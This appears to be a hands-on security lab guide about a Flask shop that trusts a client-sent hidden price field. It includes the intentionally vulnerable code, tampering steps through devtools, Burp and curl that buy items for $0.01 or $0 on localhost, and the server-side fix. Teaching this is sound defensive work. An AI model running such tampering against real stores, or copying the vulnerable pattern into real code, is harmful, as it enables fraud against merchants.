# Lab 5 — Price Manipulation (Client-Side Trust)

## Overview

Price manipulation vulnerabilities occur when an application trusts client-supplied data for critical business logic — in this case, product pricing. If the price is sent from the client (e.g., in a hidden form field or request parameter) and the server uses it without validating against the database, an attacker can modify the price to any value.

This is a subset of the broader **"Broken Access Control"** and **"Mass Assignment"** vulnerability classes. The core issue: the server trusts data that the client can control.

## Step 1 — Analyze the Code

Open `app/app.py` and look at the `/buy` endpoint (lines ~53-71):

```python
@app.route('/buy', methods=['POST'])
def buy():
    product_id = request.form['product_id']
    quantity = int(request.form['quantity'])
    price = float(request.form['price'])  # VULNERABLE: trusting client-sent price

    conn = get_db()
    product = conn.execute("SELECT * FROM products WHERE id=?", (product_id,)).fetchone()
    if not product:
        conn.close()
        return "Product not found", 404

    total = price * quantity
    conn.execute("INSERT INTO orders (...) VALUES (?, ?, ?, ?, ?, ?)",
                 (product['name'], product_id, quantity, price, total, ...))
```

**Why this is vulnerable:** The `price` comes from `request.form['price']` — a value sent by the client's browser. The server uses this price to calculate the total and create the order, without ever checking it against the actual price in the database.

Now look at `app/templates/shop.html`:
```html
<form method="POST" action="/buy">
    <input type="hidden" name="product_id" value="{{ p.id }}">
    <input type="hidden" name="price" value="{{ p.price }}">
    <input type="hidden" name="quantity" value="1">
    <button type="submit" class="btn btn-small">Buy Now</button>
</form>
```

The price is a hidden form field — invisible in the browser but easily modifiable with developer tools or by intercepting the request.

## Step 2 — Exploit the Vulnerability

### Prerequisites
- Start the lab: `docker compose up --build`
- App is at: `http://localhost:5005`

### Step 2.1 — Normal purchase (verify app works)

1. Go to `http://localhost:5005`
2. Click "Buy Now" on any product (e.g., Laptop Pro 15 at $999.99)
3. You see the order confirmation showing the correct price and total
4. Check `http://localhost:5005/admin/orders` to see the order

### Step 2.2 — Exploit using browser developer tools

1. Go to `http://localhost:5005`
2. Right-click the "Buy Now" button for the Laptop ($999.99) and click "Inspect Element"
3. Find the hidden input field:
   ```html
   <input type="hidden" name="price" value="999.99">
   ```
4. Change the value to `0.01`:
   ```html
   <input type="hidden" name="price" value="0.01">
   ```
5. Click "Buy Now"
6. The order confirmation shows: **Total: $0.01** for a Laptop!

[Screenshot: Order confirmation showing Laptop Pro 15 purchased for $0.01]

### Step 2.3 — Exploit using Burp Suite

1. Configure Burp as your browser's proxy
2. Click "Buy Now" on the Laptop
3. Burp intercepts:
   ```
   POST /buy HTTP/1.1
   Host: localhost:5005
   Content-Type: application/x-www-form-urlencoded

   product_id=1&price=999.99&quantity=1
   ```
4. Change `price=999.99` to `price=0.01`
5. Forward the request
6. Order confirmation shows $0.01

### Step 2.4 — Exploit via curl

```bash
# Buy a $999.99 laptop for $0.01
curl -X POST http://localhost:5005/buy \
  -d "product_id=1&quantity=1&price=0.01"

# Buy 10 smartphones for free
curl -X POST http://localhost:5005/buy \
  -d "product_id=2&quantity=10&price=0"

# Check the damage
curl http://localhost:5005/admin/orders
```

[Screenshot: Admin orders page showing manipulated prices]

### Step 2.5 — View the damage

Go to `http://localhost:5005/admin/orders` to see all orders with manipulated prices alongside legitimate ones.

## Step 3 — Discuss & Implement the Fix

### The Problem
The server trusts the client-sent `price` field instead of looking up the authoritative price from the database.

### The Fix
Ignore the client-sent price entirely. Look up the price server-side from the database.

**Before** (`app/app.py`, lines ~57-65):
```python
price = float(request.form['price'])  # Trusting client-sent price!

conn = get_db()
product = conn.execute("SELECT * FROM products WHERE id=?", (product_id,)).fetchone()

total = price * quantity
```

**After:**
```python
conn = get_db()
product = conn.execute("SELECT * FROM products WHERE id=?", (product_id,)).fetchone()
if not product:
    conn.close()
    return "Product not found", 404

price = product['price']  # Always use server-side price
total = price * quantity
```

You can also remove the `<input type="hidden" name="price" ...>` from `shop.html` since it's no longer needed (but even if left in, the server ignores it).

### Why This Works
The price is now determined entirely by the server from the database. The client cannot influence it regardless of what they send in the request. Even if the `price` form field is present, it's ignored.

**General principle:** Never trust the client for anything the server can determine itself. Prices, permissions, user IDs — always validate or derive these server-side.

## Step 4 — Verify the Fix

1. Apply the fix in `app/app.py`: ignore `request.form['price']` and use `product['price']` instead
2. Restart: `docker compose down && docker compose up --build`
3. Attempt the same attack:
   ```bash
   curl -X POST http://localhost:5005/buy \
     -d "product_id=1&quantity=1&price=0.01"
   ```
4. Result: The order confirmation shows **$999.99** (the real price), not $0.01
5. Check `/admin/orders` — the order has the correct price

6. Verify normal functionality:
   - Click "Buy Now" in the browser — correct price is charged
   - Orders reflect actual product prices

[Screenshot: Order confirmation showing the correct price of $999.99 despite attempting price=0.01]

**Remember to revert the fix** so the lab ships in its vulnerable state.
